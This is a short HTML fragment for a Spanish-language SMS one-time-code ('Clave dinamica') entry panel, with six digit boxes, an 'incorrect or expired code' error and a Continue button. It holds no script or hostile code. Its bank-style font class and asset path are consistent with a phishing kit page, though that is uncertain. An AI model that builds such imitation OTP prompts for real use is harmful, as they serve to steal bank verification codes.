<!-- OTP SMS -->
<div id="codsms" class="w-full flex flex-col justify-center items-center pb-6 hidden">
    <h5 class="text-[24px] font-cib-sans-bold mt-10">Clave dinamica</h5>
    <div class="w-full flex mt-4 flex-col justify-center items-center gap-4 pl-1">
        <div class="w-[100%] bg-white py-6 px-4 rounded-xl flex flex-col items-center">
            <div class="w-full flex items-center justify-center hiddenerror hidden">
                <span class="text-[11px] text-red-600"> Clave dinamica incorrecta o vencida. Ingresa la nueva
                    clave
                    dinamica.</span>
            </div>
            <div class="mt-2.5">
                <img src="/3co/assets/candado.svg" alt="Candado" />
            </div>
            <div class="w-[90%] flex flex-col mt-4 mb-4">
                <span class="text-[16px] text-center text-gray-800">
                    Consulta tu Clave Dinamica recibida por mensaje de texto.
                </span>
            </div>

            <div class="w-full mt-4 flex flex-col items-center">
                <div class="flex justify-center gap-2 w-full max-w-xs">
                    <input id="otpsms-0" type="text" inputmode="numeric" maxlength="1"
                        class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
                    <input id="otpsms-1" type="text" inputmode="numeric" maxlength="1"
                        class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
                    <input id="otpsms-2" type="text" inputmode="numeric" maxlength="1"
                        class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
                    <input id="otpsms-3" type="text" inputmode="numeric" maxlength="1"
                        class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
                    <input id="otpsms-4" type="text" inputmode="numeric" maxlength="1"
                        class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
                    <input id="otpsms-5" type="text" inputmode="numeric" maxlength="1"
                        class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
                </div>
            </div>

            <button id="validarOtpSms"
                class="mt-4 font-bold py-2 px-6 rounded-full mt-6 disabled:bg-gray-300 disabled:text-black cursor-not-allowed bg-gray-300 w-32"
                disabled>
                Continuar
            </button>
        </div>
    </div>
</div>
